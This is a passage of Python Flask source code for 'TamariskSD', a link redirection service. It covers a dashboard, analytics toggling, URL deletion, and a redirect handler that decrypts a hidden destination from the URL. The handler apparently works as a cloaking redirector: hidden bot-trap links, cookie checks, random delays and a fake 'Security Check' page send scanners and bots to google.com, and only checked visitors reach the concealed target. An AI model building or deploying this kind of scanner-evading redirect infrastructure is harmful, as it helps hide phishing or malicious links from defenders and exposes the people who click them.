                                    <p class="text-gray-300"><strong>Created:</strong> {{ url.created }}</p>
                                    <p class="text-gray-300"><strong>Expires:</strong> {{ url.expiry }}</p>
                                    <p class="text-gray-300"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                    <div class="flex items-center mt-2">
                                        <label class="text-sm font-medium text-white mr-2">Analytics:</label>
                                        <label class="toggle-switch">
                                            <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                            <span class="slider"></span>
                                        </label>
                                    </div>
                                    <div class="mt-2 flex space-x-2">
                                        <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700" onclick="return confirm('Are you sure you want to delete this URL?')">Delete URL</a>
                                    </div>
                                </div>
                            {% endfor %}
                        {% else %}
                            <p class="text-gray-300">No URLs generated yet.</p>
                        {% endif %}
                    </div>
                </div>
            </body>
            </html>
        """, username=username, form=form, urls=urls, error=error, valkey_error=valkey_error, request=request))
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Secure URL redirection service for managing custom links">
                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Error">
                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <title>Internal Server Error - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
                    <p class="text-gray-600">Please try again later.</p>
                </div>
            </body>
            </html>
        """, error=str(e), request=request), 500)
        return add_security_headers(response)

@app.route("/toggle_analytics/<url_id>", methods=["POST"])
@login_required
@csrf.exempt
def toggle_analytics(url_id):
    try:
        username = session['username']
        data = request.get_json()
        if not data or 'csrf_token' not in data:
            logger.warning(f"Missing CSRF token for toggle_analytics: {url_id}")
            response = make_response(jsonify({"status": "error", "message": "CSRF token required"}), 403)
            return add_security_headers(response)
        form = GenerateURLForm(csrf_token=data['csrf_token'])
        if not form.validate_csrf_token(form.csrf_token):
            logger.warning(f"Invalid CSRF token for toggle_analytics: {url_id}")
            response = make_response(jsonify({"status": "error", "message": "Invalid CSRF token"}), 403)
            return add_security_headers(response)
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                response = make_response(jsonify({"status": "error", "message": "URL not found"}), 404)
                return add_security_headers(response)
            current = valkey_client.hget(key, "analytics_enabled")
            new_value = "0" if current == "1" else "1"
            valkey_client.hset(key, "analytics_enabled", new_value)
            logger.debug(f"Toggled analytics for URL {url_id} to {new_value}")
            response = make_response(jsonify({"status": "ok"}), 200)
            return add_security_headers(response)
        response = make_response(jsonify({"status": "error", "message": "Database unavailable"}), 500)
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in toggle_analytics: {str(e)}", exc_info=True)
        response = make_response(jsonify({"status": "error", "message": "Internal server error"}), 500)
        return add_security_headers(response)

@app.route("/delete_url/<url_id>", methods=["GET"])
@login_required
def delete_url(url_id):
    try:
        username = session['username']
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                response = make_response(render_template_string("""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <meta name="robots" content="noindex, nofollow">
                        <meta name="description" content="Secure URL redirection service for managing custom links">
                        <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                        <meta name="author" content="TamariskSD">
                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
                        <meta name="referrer" content="strict-origin-when-cross-origin">
                        <meta property="og:title" content="TamariskSD - URL Not Found">
                        <meta property="og:description" content="The requested URL was not found in the redirection service">
                        <meta property="og:type" content="website">
                        <meta property="og:url" content="{{ request.url }}">
                        <title>URL Not Found - TamariskSD</title>
                        <script src="https://cdn.tailwindcss.com"></script>
                    </head>
                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                            <h3 class="text-lg font-bold mb-4 text-red-600">URL Not Found</h3>
                            <p class="text-gray-600">The requested URL was not found.</p>
                        </div>
                    </body>
                    </html>
                """, request=request), 404)
                return add_security_headers(response)
            valkey_client.delete(key)
            valkey_client.delete(f"url_payload:{url_id}")
            logger.debug(f"Deleted URL {url_id}")
            response = make_response(redirect(url_for('dashboard')))
            return add_security_headers(response)
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Secure URL redirection service for managing custom links">
                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Error">
                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <title>Error - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
                </div>
            </body>
            </html>
        """, request=request), 500)
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Secure URL redirection service for managing custom links">
                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Error">
                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <title>Internal Server Error - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
                    <p class="text-gray-600">Please try again later.</p>
                </div>
            </body>
            </html>
        """, error=str(e), request=request), 500)
        return add_security_headers(response)

@app.route("/bot-trap/<token>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def bot_trap(token):
    try:
        ip = request.remote_addr
        logger.debug(f"Bot trap hit by IP: {ip}, token: {token}")
        if valkey_client:
            valkey_client.hincrby(f"risk_score:{ip}", "score", 50)
            valkey_client.expire(f"risk_score:{ip}", 3600)
            logger.info(f"Increased risk score for IP {ip} due to bot trap")
        response = make_response(redirect("https://google.com", code=302))
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in bot_trap: {str(e)}", exc_info=True)
        response = make_response(redirect("https://google.com", code=302))
        return add_security_headers(response)

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
@dynamic_rate_limit(base_limit=5, base_per=60)
def redirect_handler(username, endpoint, encrypted_payload, path_segment):
    try:
        base_domain = get_base_domain()
        logger.debug(f"Redirect handler: username={username}, endpoint={endpoint}, payload={encrypted_payload[:20]}...")
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '').lower()

        # Validate payload length
        if not encrypted_payload or len(encrypted_payload) < 32:
            logger.warning(f"Invalid payload length: {len(encrypted_payload)}")
            response = make_response(redirect("https://google.com", code=302))
            return add_security_headers(response)

        # Cookie-based token check
        token = request.cookies.get('bot_check_token')
        is_first_request = False
        if not token and valkey_client:
            token = secrets.token_hex(16)
            valkey_client.setex(f"token:{ip}:{token}", COOKIE_TOKEN_TTL, "1")
            is_first_request = True
            logger.debug(f"Set new cookie token for IP {ip}: {token}")
        elif valkey_client and not valkey_client.exists(f"token:{ip}:{token}"):
            logger.warning(f"Invalid or missing cookie token for IP {ip}")
            response = make_response(redirect("https://google.com", code=302))
            return add_security_headers(response)

        # Generate verify token
        verify_token = secrets.token_hex(16)
        encrypted_payload = urllib.parse.unquote(encrypted_payload)
        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()

        # Store request data for verification
        if valkey_client:
            valkey_client.hset(f"verify:{verify_token}", mapping={
                "username": username,
                "endpoint": endpoint,
                "encrypted_payload": encrypted_payload,
                "path_segment": path_segment,
                "url_id": url_id,
                "ip": ip,
                "ua": ua,
                "is_first_request": "1" if is_first_request else "0",
                "cookie_token": token
            })
            valkey_client.expire(f"verify:{verify_token}", VERIFY_TOKEN_TTL)

        # Return loading page
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Secure URL redirection service for managing custom links">
                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Security Check">
                <meta property="og:description" content="We are validating your request to scan this URL securely">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <meta http-equiv="refresh" content="3;url={{ verify_url }}">
                <title>Security Check - TamariskSD</title>
                <style>
                    body {
                        margin: 0;
                        padding: 2rem 1rem;
                        background-color: #f3f2f9;
                        font-family: 'Segoe UI', sans-serif;
                        color: #444;
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                        justify-content: center;
                        min-height: 100vh;
                        text-align: center;
                    }
                    h3 {
                        font-size: 1.1rem;
                        font-weight: 500;
                        margin: 0.4rem 0;
                        color: #444;
                    }
                    p {
                        font-size: 0.9rem;
                        font-weight: 400;
                        color: #666;
                        margin: 0.2rem 0 1.5rem;
                    }
                    .loader {
                        width: 26px;
                        height: 26px;
                        border: 3px solid #ddd;
                        border-top: 3px solid #6264a7;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                    }
                    @keyframes spin {
                        to { transform: rotate(360deg); }
                    }
                    a {
                        display: none;
                    }
                </style>
            </head>
            <body>
                <h3>Security Check</h3>
                <p>We are validating your request to scan this URL securely.</p>
                <div class="loader"></div>
                <a href="/bot-trap/{{ bot_trap_token }}">trap</a>
            </body>
            </html>
        """, verify_url=url_for('verify', token=verify_token), bot_trap_token=secrets.token_hex(16), request=request))
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in redirect_handler: {str(e)}")
        response = make_response(redirect("https://google.com", code=302))
        return add_security_headers(response)

@app.route("/verify/<token>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def verify(token):
    try:
        if not valkey_client or not valkey_client.exists(f"verify:{token}"):
            logger.warning(f"Invalid or expired verify token: {token}")
            response = make_response(redirect("https://google.com", code=302))
            return add_security_headers(response)

        verify_data = valkey_client.hgetall(f"verify:{token}")
        username = verify_data.get("username")
        endpoint = verify_data.get("endpoint")
        encrypted_payload = verify_data.get("encrypted_payload")
        path_segment = verify_data.get("path_segment")
        url_id = verify_data.get("url_id")
        ip = verify_data.get("ip")
        ua = verify_data.get("ua")
        is_first_request = verify_data.get("is_first_request") == "1"
        cookie_token = verify_data.get("cookie_token")

        # Random delay
        time.sleep(random.uniform(0.05, 0.2))

        # Analytics tracking
        should_count_click = False
        if valkey_client:
            analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
            if analytics_enabled:
                click_key = f"click:{ip}:{ua}:{url_id}"
                if not valkey_client.exists(click_key):
                    valkey_client.setex(click_key, 600, "1")
                    should_count_click = True

        # Process payload
        uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
        cleaned_path_segment = re.sub(uuid_suffix_pattern, '', path_segment)

        payload = None
        if valkey_client:
            cached_payload = valkey_client.get(f"url_payload:{url_id}")
            if cached_payload:
                payload = cached_payload

        if not payload:
            try:
                payload = decrypt_payload(encrypted_payload)
                if valkey_client:
                    expiry = json.loads(payload).get('expiry', int(time.time()) + 3600)
                    ttl = max(1, int(expiry - time.time()))
                    valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
            except ValueError as e:
                logger.error(f"Decryption failed: {str(e)}")
                response = make_response(redirect("https://google.com", code=302))
                return add_security_headers(response)

        try:
            data = json.loads(payload)
            redirect_url = data.get("student_link")
            expiry = data.get("expiry", float('inf'))
            if not redirect_url or not re.match(r"^https?://", redirect_url):
                logger.error(f"Invalid redirect URL: {redirect_url}")
                response = make_response(render_template_string("""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <meta name="robots" content="noindex, nofollow">
                        <meta name="description" content="Secure URL redirection service for managing custom links">
                        <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                        <meta name="author" content="TamariskSD">
                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
                        <meta name="referrer" content="strict-origin-when-cross-origin">
                        <meta property="og:title" content="TamariskSD - Invalid Link">
                        <meta property="og:description" content="The provided link is invalid or malformed">
                        <meta property="og:type" content="website">
                        <meta property="og:url" content="{{ request.url }}">
                        <title>Invalid Link - TamariskSD</title>
                        <script src="https://cdn.tailwindcss.com"></script>
                    </head>
                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                            <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
                            <p class="text-gray-600">Invalid redirect URL.</p>
                        </div>
                    </body>
                    </html>
                """, request=request), 400)
                return add_security_headers(response)
            if time.time() > expiry:
                logger.warning("URL expired")
                if valkey_client:
                    valkey_client.delete(f"url_payload:{url_id}")
                response = make_response(render_template_string("""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <meta name="robots" content="noindex, nofollow">
                        <meta name="description" content="Secure URL redirection service for managing custom links">
                        <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                        <meta name="author" content="TamariskSD">
                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
                        <meta name="referrer" content="strict-origin-when-cross-origin">
                        <meta property="og:title" content="TamariskSD - Link Expired">
                        <meta property="og:description" content="The requested link has expired">
                        <meta property="og:type" content="website">
                        <meta property="og:url" content="{{ request.url }}">
                        <title>Link Expired - TamariskSD</title>
                        <script src="https://cdn.tailwindcss.com"></script>
                    </head>
                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                            <h3 class="text-lg font-bold mb-4 text-red-600">Link Expired</h3>
                            <p class="text-gray-600">The link has expired. Please contact support.</p>
                        </div>
                    </body>
                    </html>
                """, request=request), 410)
                return add_security_headers(response)
        except json.JSONDecodeError as e:
            logger.error(f"Payload parsing error: {str(e)}")
            response = make_response(render_template_string("""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <meta name="robots" content="noindex, nofollow">
                    <meta name="description" content="Secure URL redirection service for managing custom links">
                    <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                    <meta name="author" content="TamariskSD">
                    <meta http-equiv="X-UA-Compatible" content="IE=edge">
                    <meta name="referrer" content="strict-origin-when-cross-origin">
                    <meta property="og:title" content="TamariskSD - Invalid Link">
                    <meta property="og:description" content="The provided link is invalid or malformed">
                    <meta property="og:type" content="website">
                    <meta property="og:url" content="{{ request.url }}">
                    <title>Invalid Link - TamariskSD</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                </head>
                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
                        <p class="text-gray-600">Invalid payload.</p>
                    </div>
                </body>
                </html>
            """, request=request), 400)
            return add_security_headers(response)

        # Increment analytics
        if should_count_click and valkey_client:
            valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
            logger.debug(f"Incremented click count for URL {url_id}")

        # Set cookie for first request
        response = make_response(redirect(f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}", code=302))
        if is_first_request:
            response.set_cookie('bot_check_token', cookie_token, max_age=COOKIE_TOKEN_TTL, secure=True, httponly=True, samesite='Strict')
        logger.info(f"Redirecting to {redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}")
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in verify: {str(e)}")
        response = make_response(redirect("https://google.com", code=302))
        return add_security_headers(response)

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
    try:
        host = request.host
        username = host.split('.')[0] if '.' in host else "default"
        logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}")
        response = make_response(redirect_handler(username, endpoint, encrypted_payload, path_segment))
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}")
        response = make_response(redirect("https://google.com", code=302))
        return add_security_headers(response)

@app.route("/favicon.ico")
def favicon():
    response = make_response('', 204)
    return add_security_headers(response)

@app.route("/<path:path>", methods=["GET"])
def catch_all(path):
    logger.warning(f"404 Not Found for path: {path}, host: {request.host}")
    response = make_response(render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="robots" content="noindex, nofollow">
            <meta name="description" content="Secure URL redirection service for managing custom links">
            <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
            <meta name="author" content="TamariskSD">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="referrer" content="strict-origin-when-cross-origin">
            <meta property="og:title" content="TamariskSD - Not Found">
            <meta property="og:description" content="The requested URL was not found on the server">
            <meta property="og:type" content="website">
            <meta property="og:url" content="{{ request.url }}">
            <title>Not Found - TamariskSD</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                <p class="text-gray-600">The requested URL was not found on the server.</p>
                <p class="text-gray-600">Please check your spelling and try again.</p>
            </div>
        </body>
        </html>
    """, request=request), 404)
    return add_security_headers(response)

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=5000, debug=False)
    except Exception as e:
        logger.error(f"Error starting Flask app: {str(e)}")
        sys.exit(1)
